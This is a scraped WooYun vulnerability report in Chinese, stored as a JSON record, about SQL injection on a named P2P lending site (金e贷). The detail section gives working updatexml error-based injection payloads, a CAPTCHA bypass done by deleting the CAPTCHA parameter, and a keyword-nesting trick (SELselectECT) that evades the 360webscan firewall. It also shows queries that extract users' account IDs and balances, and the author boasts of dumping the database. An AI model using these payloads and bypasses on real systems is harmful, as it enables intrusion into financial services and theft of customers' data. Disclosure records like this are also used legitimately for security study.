{"id": 68620, "wybug_id": "wooyun-2015-0141189", "wybug_title": "P2P安全之金e贷站点手工注入过验证码过360webscan", "wybug_corp": "金e贷", "wybug_author": "孔卡", "wybug_date": "2015-09-15 08:30", "wybug_open_date": "2015-10-30 08:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["手工注入", "验证码机制有问题"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-15：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-10-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 表哥们 首先我知道这个洞估计是被不认领的节奏，所以我做好了wooyun评价的准备，对了这个洞的厂商可以提交给360么？虽然结果很2~~~~ 详细说明：  0x01 站内信处过滤不严 有注入\n'or updatexml(1,concat(0x7e,(database())),0) or '\n\n\n\n\n0x02 过验证码上图中可以看到数据包是有验证码的，你能想象burp里每次改一次语句，我还得人工识别一次验证码给填上的囧样么~~~~然后发现 把验证码的参数删除后，也能正确执行~~~~0x03 过360webscanunion seleclt等关键字一出现 立刻就被360webscan拦截，总是出不了报错结果，耐心的测试了几次后，发现，\nSELselectECT\n这样编码一下，成功绕过360webscan出现结果   漏洞证明：  0x01 查表名\n'or updatexml(0,concat(0x7e,(SELselectECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),1) or '\n\n\n0x02 查字段（以上图中的表名为例）\n'or updatexml(0,concat(0x7e,(SELselectECT concat(column_name) FROM information_schema.columns WHERE table_name='deayou_account' limit 12,1)),0) or '\n\n\n0x03 查字段内容 （调整上图中limit 12,1遍历几列，选了几个字段）\n'or updatexml(0,concat(0x7e,(SELselectECT concat_ws(':',id,user_id,total) FROM deayou_account limit 0,1)),0) or '\n\n\n嗯嗯，第一个人有6W多呢，遍历了下 几十W资金的人蛮多的~~~~~够详细了吧，手工脱裤实现了。   修复方案：  过滤contents字段360webscan要不要更新一下？   版权声明：转载请注明来源 孔卡@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-11-04 22:18 |    \t\t孔卡 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:12        | 我已经过了那个餐桌上只有一条鸡腿就一定能...)\t\t \n  @浩天  表哥 求补rank  打字费。。。百字还给5毛呢    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}